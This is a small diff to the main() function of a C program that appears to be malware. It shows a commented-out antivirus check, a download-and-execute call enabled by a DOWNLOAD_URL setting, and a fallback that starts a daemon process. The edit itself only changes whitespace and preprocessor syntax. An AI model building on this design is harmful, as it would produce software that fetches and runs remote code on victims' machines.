@@ -18,11 +18,13 @@ int main(void) {
 
 	//check_for_antivirus();
 
+
+
 	#ifdef DOWNLOAD_URL
 	download_exec();
 	#endif
 
-	#ifndef DOWNLOAD_URL
+	#if !defined(DOWNLOAD_URL)
 	create_deamon_process();
 	#endif
 
